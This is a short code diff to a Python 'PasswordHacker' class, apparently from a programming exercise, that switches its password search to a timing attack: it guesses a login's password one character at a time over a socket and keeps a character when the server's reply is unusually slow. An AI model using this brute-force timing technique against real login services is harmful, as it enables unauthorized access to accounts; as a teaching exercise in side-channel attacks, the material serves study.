@@ -1,9 +1,9 @@
-import itertools
 import json
 import os
 import socket
 import string
 import sys
+from timeit import timeit, repeat
 
 
 class PasswordHacker:
@@ -11,6 +11,7 @@ class PasswordHacker:
         self.address = (ip, int(port))
         self.client = None
         self.log_data = {'login': '', 'password': ''}
+        self.resp_time = None
 
     def connect(self):
         self.client = socket.socket()
@@ -32,13 +33,15 @@ class PasswordHacker:
 
     def find_password(self):
         letters = string.ascii_letters + string.digits
+        self.resp_time = max(repeat('self.send_msg()', repeat=100, number=1, globals=locals()))
         while True:
             for letter in letters:
                 self.log_data['password'] += letter
+                time = timeit('self.send_msg()', number=1, globals=locals())
                 response = self.send_msg()
                 if response == {'result': 'Connection success!'}:
                     return
-                elif response == {'result': 'Exception happened during login'}:
+                elif time > self.resp_time * 2:
                     break
                 self.log_data['password'] = self.log_data['password'][:-1]
 
